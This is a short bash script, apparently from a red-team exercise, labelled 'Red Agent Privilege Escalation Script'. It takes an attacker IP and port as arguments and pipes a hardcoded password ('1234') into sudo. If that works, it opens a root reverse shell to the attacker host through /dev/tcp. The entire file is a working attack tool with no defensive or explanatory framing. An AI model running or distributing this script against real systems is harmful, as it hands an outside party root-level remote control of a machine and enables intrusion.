#!/bin/bash

# Red Agent Privilege Escalation Script
# 1. Check if the user is root
# 2. Attempt a reverse shell as root

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <attacker-ip> <attacker-port>"
    echo "Example: $0 10.0.0.1 4445"
    exit 1
fi

# Set your attacker machine's IP and port here
attacker_ip=$1
attacker_port=$2

echo "[*] Attempting privilege escalation..."

# Try to escalate to root
if printf '1234\n' | sudo -S whoami 2>/dev/null | grep -q root; then
    echo "[+] Privilege escalation successful. Spawning root reverse shell to $attacker_ip:$attacker_port ..."
    
    # Send reverse shell as root
    printf '1234\n' | sudo -S /bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"
else
    echo "[!] Privilege escalation failed."
fi
